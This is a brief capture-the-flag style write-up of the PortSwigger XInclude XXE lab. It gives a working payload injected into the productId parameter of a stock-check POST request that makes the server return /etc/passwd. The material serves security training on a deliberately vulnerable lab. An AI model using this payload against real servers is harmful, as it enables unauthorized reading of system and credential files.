
https://portswigger.net/web-security/xxe/lab-xinclude-attack

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.


1) perform a POST request to /product/stock and we can notice that the body is not structured as XML but we can try to inject xml including  XInclude namespace 

    so we can inject into productId=this

    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1


this allows us to read the file /etc/passwd in response
